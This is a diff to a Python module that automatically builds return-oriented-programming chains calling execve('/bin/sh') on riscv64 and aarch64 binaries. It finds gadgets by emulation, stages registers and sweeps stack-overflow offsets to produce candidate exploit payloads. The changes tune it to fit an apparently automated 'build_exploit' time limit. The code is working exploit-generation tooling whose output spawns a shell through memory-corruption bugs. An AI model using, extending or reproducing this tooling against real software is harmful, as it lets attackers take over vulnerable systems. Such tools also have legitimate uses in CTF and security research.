@@ -186,7 +186,7 @@ def _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates, n
 
 def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, offset: int,
                           segments=None, max_insns: int = 20, max_candidates: int = 120,
-                          stack_range=(8, 200, 8), word: int = 8):
+                          base_span: int = 160, word: int = 8):
     """execve("/bin/sh", NULL, NULL) via a MULTI-REGISTER ra-threaded chain on the link-register arches
     (riscv64 / aarch64) -- the multi-register extension of solve_lr_chain. Where `system` needs only
     a0, execve needs a0=&binsh, a1=0 (argv), a2=0 (envp) AND the syscall `gateway` (libc's `mov x8,#221;
@@ -200,9 +200,12 @@ def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, o
          and ra -> the caller.
       caller: `mv a0,sS; (jr|br) sB` with sB=gateway -> a0=&binsh and branch to the gateway.
 
-    L0's entry sp is swept over the overflow; LB's entry sp is L0's + L0's spadj (the post-index). All
-    gadgets are DISCOVERED by gadget_emu (emulated effects), so a1/a2 being cleanly zeroable in a
-    ra-restoring gadget is a MEASURED fact, not an assumption. Returns candidate payloads
+    LB's entry sp is swept over the overflow (starting at offset+word, where the vulnerable frame's
+    `ret` leaves sp, so the real position is tried FIRST -- a sliced build_exploit reaches the
+    confirming candidate before its deadline instead of after an absolute 8.. sweep); L0's entry sp is
+    LB's + LB's spadj (the post-index). All gadgets are DISCOVERED by gadget_emu (emulated effects), so
+    a1/a2 being cleanly zeroable in a ra-restoring gadget is a MEASURED fact, not an assumption.
+    Returns candidate payloads
     {payload, l0, lb, caller, base, sS, sB, a0_off}, or [] when NO arg-zeroing loader exists -- the
     honest decline the riscv a2/envp scarcity produces (there a2 is reachable only as a2<-a0, never
     cleanly zeroed in a ret-terminated gadget), proven by emulation rather than asserted."""
@@ -214,32 +217,40 @@ def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, o
         from .rop import _loads
         segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
 
-    # Callers must leave a1/a2 untouched (they are set before the caller runs); the engine certifies it.
+    # Callers must leave a1/a2 untouched (set before the caller runs); the engine certifies it. Kept on
+    # their OWN short scan (max_insns=6): a caller is `mv a0,sS; jr sB` with spadj 0, and a longer
+    # window would let a richer-but-sp-touching gadget win the same `jr` and disqualify it.
     callers = _lr_callers(data, arch, callee, segments, max_candidates, preserve=("a1", "a2"))
-    value_loaders = _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates)
 
-    # ARG-ZEROING LOADERS (L0): ret-terminated, a1 AND a2 both cleanly controllable (hardwired zero,
-    # verified across seedings so an arithmetic 0 doesn't masquerade, or loaded from a stack slot we
-    # set to 0), ra <- stack, AND it must PRESERVE the callee-saved regs (so sS/sB staged by LB survive
-    # it). This is the step the riscv a2/envp wall removes: no ret-terminated gadget there leaves a2 as
-    # a clean zero/stack across seedings, so arg_loaders comes back empty -> honest [].
-    ga = gadget_emu.find_reg_control_gadgets(data, arch, want=("a1", "a2", "ra"), segments=segments,
-                                             max_insns=max_insns, max_results=max_candidates * 40,
-                                             scan_cap=200_000_000, preserve=tuple(callee))
-    arg_loaders = []
-    for g in ga:
+    # The two LOADER classes share ONE scan of the image, then split by effects -- not two. Scanning a
+    # static libc (~1MB exec) separately for value and arg loaders with the sound engine (multi-seed +
+    # control-flow decode) overran the autopilot's build_exploit time slice; one pass over the
+    # ret-terminated epilogues, classified below, fits it. Preserve the callee-saved regs so an arg
+    # loader that clobbers the staged sS/sB is rejected.
+    loaders = gadget_emu.find_reg_control_gadgets(
+        data, arch, want=("a1", "a2", "ra") + tuple(callee), segments=segments, max_insns=max_insns,
+        max_results=max_candidates * 60, scan_cap=200_000_000, preserve=tuple(callee))
+    value_loaders, arg_loaders = [], []
+    for g in loaders:
         e = g["effects"]
-        ra, a1, a2 = e.get("ra", ""), e.get("a1", ""), e.get("a2", "")
+        ra = e.get("ra", "")
         if g["term"] != "ret" or not ra.startswith("stack@"):
             continue
-        if not (a1 == "zero" or a1.startswith("stack@")):
-            continue
-        if not (a2 == "zero" or a2.startswith("stack@")):
-            continue
-        arg_loaders.append({"va": g["va"], "spadj": g["spadj"], "raoff": int(ra.split("@")[1]),
-                            "a1": None if a1 == "zero" else int(a1.split("@")[1]),
-                            "a2": None if a2 == "zero" else int(a2.split("@")[1]),
-                            "keep": set(g.get("preserved", ()))})
+        raoff = int(ra.split("@")[1])
+        # VALUE LOADER (LB): >=2 callee-saved <- stack (stages sS=&binsh, sB=gateway) + ra <- stack.
+        regoff = {r: int(v.split("@")[1]) for r, v in e.items()
+                  if r in callee and v.startswith("stack@")}
+        if len(regoff) >= 2:
+            value_loaders.append({"va": g["va"], "raoff": raoff, "spadj": g["spadj"],
+                                  "regoff": regoff})
+        # ARG-ZEROING LOADER (L0): a1 AND a2 clean (zero verified across seedings, or stack), ra <-
+        # stack, and the callee-saved regs preserved (so sS/sB survive it).
+        a1, a2 = e.get("a1", ""), e.get("a2", "")
+        if (a1 == "zero" or a1.startswith("stack@")) and (a2 == "zero" or a2.startswith("stack@")):
+            arg_loaders.append({"va": g["va"], "spadj": g["spadj"], "raoff": raoff,
+                                "a1": None if a1 == "zero" else int(a1.split("@")[1]),
+                                "a2": None if a2 == "zero" else int(a2.split("@")[1]),
+                                "keep": set(g.get("preserved", ()))})
     if not (arg_loaders and value_loaders and callers):
         return []                        # honest 'cannot compose' (riscv a2 wall -> no arg_loaders)
 
@@ -265,7 +276,9 @@ def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, o
             for L0 in arg_loaders[:6]:                    # compact arg-zeroing loaders first
                 if sS not in L0["keep"] or sB not in L0["keep"]:
                     continue                              # L0 must not clobber the sS/sB LB staged
-                for base in range(*stack_range):          # where LB's entry sp lands in the overflow
+                # LB's entry sp lands at offset+word after the vulnerable `ret`; sweep from there (real
+                # position first) so the confirming candidate is reached early under a time slice.
+                for base in range(offset + word, offset + word + base_span, word):
                     l0_base = base + LB["spadj"]           # L0's entry sp = LB's + its post-index
                     a0_off = base + LB["regoff"][sS]
                     far = max([base + LB["regoff"][sS], base + LB["regoff"][sB], base + LB["raoff"],
